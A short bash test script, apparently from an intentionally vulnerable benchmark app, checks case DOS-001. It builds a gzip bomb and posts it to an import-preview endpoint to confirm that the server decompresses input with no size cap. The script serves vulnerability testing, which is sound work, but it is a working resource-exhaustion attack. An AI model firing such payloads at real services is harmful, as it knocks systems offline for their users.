#!/usr/bin/env bash
# DOS-001: uncontrolled resource consumption. A ~5KB gzip bomb decompresses to 5MB
# because the reader has no size cap. The safe twin bounds it with io.LimitReader.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
bomb="$(mktemp)"
trap 'rm -f "$bomb" "$JAR"' EXIT
head -c 5000000 /dev/zero | gzip -c > "$bomb"
n=$(curl -s -X POST "$TARGET/api/import/preview" --data-binary @"$bomb" | json_get bytes)
[ -n "$n" ] && [ "$n" -gt 1048576 ]
